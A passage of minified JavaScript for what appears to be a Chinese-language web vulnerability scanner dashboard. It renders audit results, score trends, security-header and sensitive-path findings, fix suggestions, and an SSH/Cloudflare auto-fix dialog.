x.confidence==="low"}),p=n.length,v=typeof o.score=="number"?o.score:o.score||"-",m=o.risk_level||o.risk||"未知",g=h.length>0?"发现 "+h.length+" 个较可信源码/上线相关问题":d.length>0?"发现少量建议复核项，优先人工确认":"未发现明显源码泄露迹象",y=h.slice(0,5).map(qi).join(""),b=Ui().map(function(x){return'<span style="display:inline-block;margin:0 8px 8px 0;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-size:12px">'+w(x)+"</span>"}).join(""),_=d.length===0?'<div style="padding:14px 16px;border:1px solid rgba(115,201,144,0.25);border-radius:2px;background:rgba(115,201,144,0.08);color:var(--text-secondary);line-height:1.7">当前扫描没有发现明显的源码泄露或上线前暴露项。建议在修复后再复测一次，并继续关注强登录态、重定向和 WAF 干扰场景。</div>':"";Xt={url:a,time:new Date().toISOString(),risk:m,score:v,total:p,headline:g,findings:d,trustedFindings:h,reviewFindings:c,rawFindings:n,coverage:[...Ui()]},t&&(t.innerHTML='<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-bottom:14px"><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">审计目标</div><div style="margin-top:6px;font-weight:700;word-break:break-all">'+w(a)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">风险等级</div><div style="margin-top:6px;font-weight:700">'+w(m)+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">安全评分</div><div style="margin-top:6px;font-weight:700">'+w(String(v))+'</div></div><div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">问题总数</div><div style="margin-top:6px;font-weight:700">'+p+'</div></div></div><div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:14px"><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">高置信度</div><div style="margin-top:4px;font-weight:700">'+u.high+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">中置信度</div><div style="margin-top:4px;font-weight:700">'+u.medium+'</div></div><div style="padding:10px 12px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><div style="font-size:12px;color:var(--text-secondary)">低置信度</div><div style="margin-top:4px;font-weight:700">'+u.low+'</div></div></div><div style="margin-bottom:14px"><div style="font-size:15px;font-weight:700;margin-bottom:8px">审计结论</div><div style="line-height:1.8;color:var(--text-secondary)">'+g+'</div></div><div style="margin-bottom:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">覆盖范围</div>'+b+"</div>"+_+(y?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">可信命中项</div>'+y+"</div>":"")+(c.length?'<div style="margin-top:14px"><div style="font-size:13px;font-weight:700;margin-bottom:8px;color:var(--text)">需复核项</div>'+c.slice(0,3).map(qi).join("")+"</div>":"")),i&&(i.textContent=h.length>0?"审计完成，已发现可信项。":d.length>0?"审计完成，发现少量建议复核项，优先人工确认。":"审计完成，未发现明显源码泄露迹象。"),T("审计完成","success")}catch(o){let n=ut(o);Xt=null,i&&(i.textContent="审计失败："+n),t&&(t.innerHTML='<div style="padding:14px 16px;border:1px solid rgba(199,84,80,0.25);border-radius:2px;background:rgba(199,84,80,0.08);color:var(--text-secondary)">'+w(n)+"</div>"),T("审计失败："+n,"error")}finally{ri=!1,r&&(r.disabled=!(s&&s.checked),r.textContent="开始审计")}}function Fs(){if(!Xt){T("请先完成一次审计","warn");return}let e=Xt,i=document.querySelector('#page-audit .card button[onclick="downloadAuditReport()"]');i&&(i.disabled=!0,i.textContent="导出中..."),ce("/api/report/audit",{method:"POST",body:JSON.stringify({url:e.url,time:e.time,risk:e.risk,risk_level:e.risk,score:e.score,total:e.total,headline:e.headline,findings:e.findings||[],summary:{critical:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="critical"}).length,high:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="high"}).length,medium:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="medium"}).length,low:(e.findings||[]).filter(function(t){return String(t.severity||"").toLowerCase()==="low"}).length,info:(e.findings||[]).filter(function(t){return!String(t.severity||"").toLowerCase()||String(t.severity||"").toLowerCase()==="info"}).length,total:e.total||(e.findings||[]).length},coverage:e.coverage||[],confidence_counts:e.confidenceCounts||{high:0,medium:0,low:0}})}).then(function(t){return t.ok?t.blob().then(function(r){let s=URL.createObjectURL(r),a=document.createElement("a");a.href=s,a.download="vuln-sentinel-audit-report.pdf",document.body.appendChild(a),a.click(),document.body.removeChild(a),URL.revokeObjectURL(s),T("审计 PDF 已下载")}):t.text().then(function(r){throw new Error(r||"HTTP "+t.status)})}).catch(function(t){T("导出失败："+ut(t),"error")}).finally(function(){i&&(i.disabled=!1,i.textContent="导出审计报告")})}function zn(){let e=document.getElementById("trend-panel");!he()||!e||(e.style.display="block",ce("/api/trend?limit=30").then(function(i){return i.json()}).then(function(i){let t=i.summary||{},r=i.series||{},s=i.urls||[],a=document.getElementById("trend-summary");if(a){let d=[];t.total_scans>0&&(d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(75,110,175,0.12);color:#4b6eaf;font-weight:600">平均 '+t.avg_score+" 分</span>"),t.improved?d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(115,201,144,0.12);color:#73c990;font-weight:600"> 评分上升中</span>'):t.total_scans>1&&d.push('<span style="font-size:12px;padding:3px 10px;border-radius:2px;background:rgba(199,84,80,0.12);color:#c75450;font-weight:600"> 评分下降中</span>')),a.innerHTML=d.join("")}let o=document.getElementById("trend-empty"),n=document.getElementById("trend-canvas");if(t.total_scans===0){o&&(o.style.display="flex"),n&&(n.style.display="none");return}o&&(o.style.display="none"),n&&(n.style.display="block"),In(r,s)}).catch(function(){}))}function In(e,i){let t=document.getElementById("trend-canvas");if(!t)return;let r=t.getContext("2d"),s=window.devicePixelRatio||1,a=t.parentElement.getBoundingClientRect();t.width=a.width*s,t.height=a.height*s,r.scale(s,s);let o=a.width,n=a.height,d=["#4b6eaf","#73c990","#f0a732","#c75450","#c75450","#4b6eaf","#4b6eaf"],u=[],h=[];for(let z=0;z<i.length;z++){let M=i[z],O=e[M]||[];if(O.length===0)continue;let j=O.map(function(P){return P.score});h=h.concat(j),u.push({url:M,points:O,color:d[z%d.length]})}if(u.length===0||h.length===0)return;let c={top:20,right:20,bottom:30,left:45},p=o-c.left-c.right,v=n-c.top-c.bottom,m=Math.max(Math.min.apply(null,h)-5,0),g=Math.min(Math.max.apply(null,h)+5,100),y=g-m||1;r.clearRect(0,0,o,n),r.strokeStyle="rgba(255,255,255,0.06)",r.lineWidth=1;let b=5;for(let z=0;z<=b;z++){let M=c.top+z/b*v;r.beginPath(),r.moveTo(c.left,M),r.lineTo(o-c.right,M),r.stroke();let O=Math.round(g-z/b*y);r.fillStyle="rgba(255,255,255,0.4)",r.font="10px sans-serif",r.textAlign="right",r.fillText(O,c.left-8,M+3)}let _=c.top+(g-90)/y*v,x=c.top+(g-70)/y*v;r.fillStyle="rgba(115,201,144,0.05)",r.fillRect(c.left,_,p,c.top-_+v),r.fillStyle="rgba(240,167,50,0.05)",r.fillRect(c.left,x,p,_-x);for(let z=0;z<u.length;z++){let M=u[z],O=M.points,j=O.length;if(j<1)continue;let P=[];for(let H=0;H<j;H++)P.push(c.left+(j>1?H/(j-1)*p:p/2));r.beginPath();for(let H=0;H<j;H++){let K=P[H],E=c.top+(g-O[H].score)/y*v;H===0?r.moveTo(K,E):r.lineTo(K,E)}r.lineTo(P[j-1],c.top+v),r.lineTo(P[0],c.top+v),r.closePath(),r.fillStyle=M.color+"15",r.fill(),r.beginPath(),r.strokeStyle=M.color,r.lineWidth=2.5,r.lineJoin="round",r.lineCap="round";for(let H=0;H<j;H++){let K=P[H],E=c.top+(g-O[H].score)/y*v;H===0?r.moveTo(K,E):r.lineTo(K,E)}r.stroke();for(let H=0;H<j;H++){let K=P[H],E=c.top+(g-O[H].score)/y*v;r.beginPath(),r.arc(K,E,4,0,Math.PI*2),r.fillStyle=M.color,r.fill(),r.beginPath(),r.arc(K,E,2,0,Math.PI*2),r.fillStyle="#fff",r.fill()}if(j>0){let H=P[j-1],K=c.top+(g-O[j-1].score)/y*v;r.beginPath(),r.arc(H,K,6,0,Math.PI*2),r.fillStyle=M.color+"40",r.fill(),r.beginPath(),r.arc(H,K,3.5,0,Math.PI*2),r.fillStyle=M.color,r.fill()}}let I=document.getElementById("trend-legend");if(I){let z="";for(let M=0;M<u.length;M++){let O=nt(u[M].url);z+='<div style="display:flex;align-items:center;gap:5px;font-size:12px">',z+='<div style="width:10px;height:3px;border-radius:2px;background:'+u[M].color+'"></div>',z+='<span style="color:var(--text-secondary)">'+w(O)+"</span>",z+="</div>"}I.innerHTML=z}}async function js(){let e=document.getElementById("public-report-host"),i=document.getElementById("public-report-refresh"),t=e&&e.value||"https://example.com";i&&(i.disabled=!0,i.textContent="扫描中…");let r=document.getElementById("public-report-content");r&&(r.innerHTML='<div style="height:120px;border-radius:2px;margin-top:12px;background:#3c3f41;border:1px solid #555555;display:flex;align-items:center;justify-content:center;color:#808080;font-size:13px">扫描中…</div>');try{let s=await ce("/api/public-演示-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t})}),a=await s.json();s.ok&&a.success?(window._lastScanId=a.scan_id||a.scanId||null,window._lastScanResult=a,Hs(a)):r&&(r.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+w(ut(qe(a)))+"</div>")}catch(s){r&&(r.innerHTML='<div style="padding:14px;color:#c75450;font-size:13px">错误：'+w(ut(s))+"</div>")}finally{i&&(i.disabled=!1,i.textContent="重新扫描")}}function Hs(e){let i=document.getElementById("public-report-content");if(!i)return;let t=e.score||0,r=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",s="#3c3f41",a=e.findings||[],o=e.summary||{high:0,medium:0,low:0},n=[];o.high&&n.push(o.high+" 高风险"),o.medium&&n.push(o.medium+" 中风险"),o.low&&n.push(o.low+" 低风险");let d=e.waf||[],u=d.length?d.map(function(y){return y.name}).join("、"):"未检测到 WAF",h=e.raw_headers||{},c=Object.keys(h),p=[];["strict-transport-security","content-security-policy","x-frame-options","x-content-type-options"].forEach(function(y){c.some(function(b){return b.toLowerCase()===y})||p.push(y)});let v=e.sensitive_paths||[],m="";v.length>0?m=v.slice(0,5).map(function(y){let b=y.exposed?"暴露":"安全";return'<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 8px;font-size:12px;border-bottom:1px solid var(--border)"><code style="color:#a5b4fc">/'+y.path+"</code><span>"+b+"</span></div>"}).join(""):m='<div style="font-size:12px;color:var(--text-secondary);padding:4px">已扫描 '+(e.sensitive_checked||0)+" 个常见敏感路径，未发现暴露</div>";let g="";if(g+='<div style="background:'+s+";border:1px solid #555555;border-left:3px solid "+r+';border-radius:2px;padding:14px;margin-top:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px">',g+='<div><div style="font-size:13px;color:var(--text-secondary)">实时扫描结果</div>',e.note&&(g+='<div style="font-size:12px;color:#f0a732;margin-top:2px">'+w(e.note)+"</div>"),g+='<div style="font-size:14px;font-weight:600;margin-top:2px">'+e.final_url+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:2px">HTTPS: '+(e.is_https?"是":"否")+" · WAF: "+u+' · 风险等级: <strong style="color:'+r+'">'+(e.risk_level||"未知")+"</strong></div></div>",g+='<div style="text-align:right"><div style="font-size:32px;font-weight:700;color:'+r+'">'+t+"</div>",g+='<div style="font-size:12px;color:var(--text-secondary)">/ 100 分</div></div>',g+="</div>",e.is_cached&&(g+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:8px 12px;margin-top:8px;font-size:12px;color:#f0a732">'+w(e.note||"当前展示缓存扫描数据")+"</div>"),g+='<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px">',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#c75450">'+o.high+'</div><div style="font-size:12px;color:var(--text-secondary)">高风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#f0a732">'+o.medium+'</div><div style="font-size:12px;color:var(--text-secondary)">中风险</div></div>',g+='<div style="background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:8px;text-align:center"><div style="font-size:18px;font-weight:700;color:#4b6eaf">'+o.low+'</div><div style="font-size:12px;color:var(--text-secondary)">低风险</div></div>',g+="</div>",g+='<details style="margin-top:12px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 1：服务器实际响应头（点击展开）</summary>',g+='<div style="margin-top:6px;background:#0f172a;color:#e2e8f0;border-radius:2px;padding:10px;font-family:monospace;font-size:12px;max-height:200px;overflow-y:auto" class="response-headers-list">',c.slice(0,15).forEach(function(y){let b=String(h[y]);g+='<div class="response-header-row"><span style="color:#a5b4fc" class="response-header-name">'+y+'</span>: <span class="response-header-value">'+w(b)+"</span></div>"}),c.length>15&&(g+='<div style="color:#64748b;margin-top:4px">... 还有 '+(c.length-15)+" 个</div>"),g+="</div></details>",g+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 2：缺失关键安全头（'+p.length+" 个）</summary>",p.length===0?g+='<div style="margin-top:6px;padding:8px;font-size:12px;color:#73c990">关键安全头已全部配置</div>':(g+='<div style="margin-top:6px;padding:8px;font-size:12px">',p.forEach(function(y){g+="缺失: "+y+"<br>"}),g+="</div>"),g+="</details>",g+='<details style="margin-top:8px"><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">真实证据 3：敏感文件探测</summary>',g+='<div style="margin-top:6px">'+m+"</div></details>",a.length>0&&(g+='<details style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（'+a.length+" 项）</summary>",g+='<div style="margin-top:6px;max-height:280px;overflow-y:auto">',a.forEach(function(y){let b=y.severity==="high"?"#c75450":y.severity==="medium"?"#f0a732":"#4b6eaf",_=y.severity==="high"?"高":y.severity==="medium"?"中":"低",x=y.fix||y.recommendation||"";g+='<div data-finding-name="'+w(y.name||"")+'" data-severity="'+(y.severity||"low")+'" data-owasp="'+w(y.owasp||"")+'" data-detail="'+w(y.detail||"")+'" data-fix="'+w(x)+'" style="padding:8px;margin-bottom:6px;border-left:3px solid '+b+';background:var(--bg);border-radius:2px">',g+='<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">'+w(y.name||"")+"</div>",g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:'+b+';color:#fff">'+_+"</span>";let z={critical:"P0",high:"P1",medium:"P2",low:"P3"}[y.severity]||"P3",M={P0:"#c75450",P1:"#f0a732",P2:"#f0a732",P3:"#73c990"};g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:'+M[z]+";font-weight:600;margin-left:6px;border:1px solid "+M[z]+'">'+z+"</span></div>";let O=["sqli","xss","csrf","ssti","open_redirect","cmdi","traversal","deserialization","ssrf","xxe","idor","info_leak","auth_weakness","bruteforce_protection","unauthorized_access","api_auth_missing","sensitive_config_exposure","clickjacking","file_upload","logic_bypass"],j=String(y.type||"").toLowerCase();O.indexOf(j)>=0&&(g+='<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>'),y.owasp&&(g+='<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: '+y.owasp+"</div>"),y.detail&&(g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+w(y.detail)+"</div>"),y.recommendation&&(g+='<div style="font-size:12px;color:#73c990;margin-top:4px">建议：'+w(y.recommendation)+"</div>"),x&&(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">建议</summary>',g+='<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+w(x)+"</pre>",g+="</details>"),x&&(y&&y.verify_steps&&y.verify_steps.length>0?(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>',g+='<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">',y.verify_steps.forEach(function(P,H){g+='<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">',g+='<div style="font-weight:600;color:var(--text-primary)">第'+(H+1)+"步："+w(P.method||"")+"</div>",P.expect&&(g+='<div style="color:var(--text-secondary);margin-top:2px">预期：'+w(P.expect)+"</div>"),g+="</div>"}),g+="</div></details>"):g+='<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：复测后重新扫描该网站，查看此项是否消失或评分是否提升。</div>'),g+='<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项需要复测，可结合建议、响应证据和二次扫描结果综合判断。</div>',g+="</div>"}),g+="</div></details>"),e&&e.fixes&&Object.keys(e.fixes).length>0){let y=e.fixes,b={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask",spring_boot:"Spring Boot",cloudflare:"Cloudflare",python:"Python",nodejs:"Node.js"},x=["nginx","apache","express","flask","spring_boot","cloudflare","nodejs","python"].filter(function(I){return y[I]&&y[I].length>0});x.length>0&&(g+='<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">',g+='<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整建议（'+x.length+" 种平台）</div>",g+='<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">',x.forEach(function(I,z){let M=z===0;g+=`<button onclick="switchPublicFixTab('`+I+`')" id="pub-fix-tab-`+I+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(M?"var(--success)":"var(--border)")+";background:"+(M?"var(--success)":"transparent")+";color:"+(M?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+b[I]+"</button>"}),g+="</div>",x.forEach(function(I,z){let M=z===0?"block":"none",O=y[I];g+='<div id="pub-fix-pane-'+I+'" style="display:'+M+';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">',O.forEach(function(j,P){let H=typeof j=="string"?j:j&&j.code?j.code:String(j);g+='<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">',g+='<div style="color:#808080;font-size:11px;margin-bottom:2px"># '+(P+1)+"</div>",g+='<pre style="margin:0;white-space:pre-wrap;word-break:break-all">'+w(H)+"</pre>",g+="</div>"}),g+="</div>"}),g+="</div>")}g+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',g+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用修复器生成补丁</button>`,he()?g+='<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>':g+=`<button onclick="navigateTo('profile')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>`,g+="</div>",i.innerHTML=g}function Ns(e){document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(r){r.style.display="none"});let i=document.getElementById("pub-fix-pane-"+e);i&&(i.style.display="block"),document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(r){r.style.background="transparent",r.style.color="var(--text-secondary)",r.style.border="1px solid var(--border)"});let t=document.getElementById("pub-fix-tab-"+e);t&&(t.style.background="var(--success)",t.style.color="#fff",t.style.border="1px solid var(--success)")}async function Ds(){let e=document.getElementById("public-report-content");if(!e)return;let i=[];if(e.querySelectorAll("[data-finding-name]").forEach(function(t){i.push({name:t.getAttribute("data-finding-name"),severity:t.getAttribute("data-severity")||"low",owasp:t.getAttribute("data-owasp")||"",detail:t.getAttribute("data-detail")||"",fix:t.getAttribute("data-fix")||""})}),i.length===0){T("没有发现需要修复的问题");return}try{if(!(he()&&window._lastScanId)){if(he()){let t=document.getElementById("public-report-host")?document.getElementById("public-report-host").value:"https://example.com",r=await ce("/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t,depth:"standard",authorized:!!(document.getElementById("auth-check-step1")&&document.getElementById("auth-check-step1").checked||document.getElementById("auth-check")&&document.getElementById("auth-check").checked)})});if(r.ok){let s=await r.json();window._lastScanId=s.scan_id}}}}catch{}try{let t={findings:i};window._lastScanId&&(t.scan_id=window._lastScanId);let r=await ce("/api/simulate-fix",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}),s=await r.json();if(!r.ok){T("生成修复配置失败");return}Cn(s)}catch(t){T("网络错误："+(t.message||t))}}function Cn(e){try{let i=document.getElementById("public-report-content");if(!i)return;if(!e||typeof e!="object"){i.innerHTML='<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';return}let t="";t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">',t+='<h3 style="margin:0;font-size:16px">修复效果预览</h3>',t+='<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>',t+="</div>",t+='<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">',t+='<div style="font-size:14px;font-weight:600;color:#73c990">'+e.summary+"</div>",t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">',t+='<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:var(--text-secondary)">复测前</div>',t+='<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">'+e.before_score+"</div>",t+="</div>",t+='<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>',t+='<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:#73c990">复测后</div>',t+='<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">'+e.after_score+"</div>",t+='<div style="font-size:12px;color:#73c990;margin-top:2px">+ '+e.delta+" 分</div>",t+="</div>",t+="</div>",t+='<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（'+e.fixed_count+" 项）</h4>",t+='<div style="max-height:300px;overflow-y:auto">',e.fixed_items.forEach(function(r,s){let a=r.severity==="high"?"#c75450":r.severity==="medium"?"#f0a732":"#4b6eaf",o=r.severity==="high"?"高":r.severity==="medium"?"中":"低";t+='<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid '+a+'">',t+='<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">'+(s+1)+".</div>",t+='<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">'+w(r.name||"")+"</span>",t+='<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:'+a+';color:#fff">'+o+"</span>",r.owasp&&(t+='<span style="font-size:11px;color:#a5b4fc">'+w(r.owasp)+"</span>"),t+="</div>",r.fix&&(t+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">'+w(r.fix).substring(0,200)+"</div>"),t+="</div></div>"}),t+="</div>",t+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',he()?(t+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>`,t+=`<button onclick="showAutoFixDialog('`+(window._lastScanId||"")+"', "+(e.fixed_count||0)+')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>'):t+=`<button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>`,t+="</div>",i.innerHTML=t}catch(i){console.error("renderFixComparison error:",i);let t=document.getElementById("public-report-content");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复对比失败: '+w(i.message||String(i))+"</p></div>")}}function Us(e,i){try{if(document.getElementById("auto-fix-dialog"))return;if(!e){T("请先完成一次扫描");return}let t="";t+='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">',t+='<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">',t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',t+='<h3 style="margin:0;font-size:18px">生成修复配置 '+i+" 项问题</h3>",t+='<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>',t+="</div>",t+='<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">',t+="<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>",t+="<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 验证头<br>",t+="<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>",t+="<b>零停机</b>：用 reload 而非 restart",t+="</div>",t+='<div style="margin-bottom:14px">',t+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">',t+='<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">',t+='<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">SSH</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>',t+="</label>",t+='<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">',t+='<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">CF</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">只需 API 令牌</div>',t+="</label>",t+="</div>",t+="</div>",t+='<div id="ssh-form">',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>',t+="</div>",t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div id="cf-form" style="display:none">',t+='<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API 令牌</label><input id="af-cf-token" type="password" placeholder="Cloudflare 令牌" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 